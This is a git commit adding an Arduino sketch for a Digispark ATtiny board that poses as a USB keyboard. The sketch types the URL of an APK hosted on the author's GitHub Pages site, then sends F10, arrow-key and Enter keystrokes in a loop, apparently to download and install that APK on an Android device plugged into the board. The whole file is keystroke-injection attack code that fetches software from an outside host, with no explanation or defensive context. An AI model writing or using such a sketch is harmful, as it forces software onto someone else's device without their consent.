eb64c5c082029073aa02dc31c7404658d91c2356
vishal-y <85288372+vishal-y@users.noreply.github.com>
2021-08-25 08:48:50 +0530

    Create attiny.ino

---
+++ attiny.ino
@@ -0,0 +1,25 @@
+
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+	DigiKeyboard.sendKeyStroke(0);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.print("https://vishal-y.github.io/auto-download/1.apk");
+	DigiKeyboard.delay(2000);
+	DigiKeyboard.sendKeyStroke(KEY_F10);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(81);
+	DigiKeyboard.sendKeyStroke(79);
+}
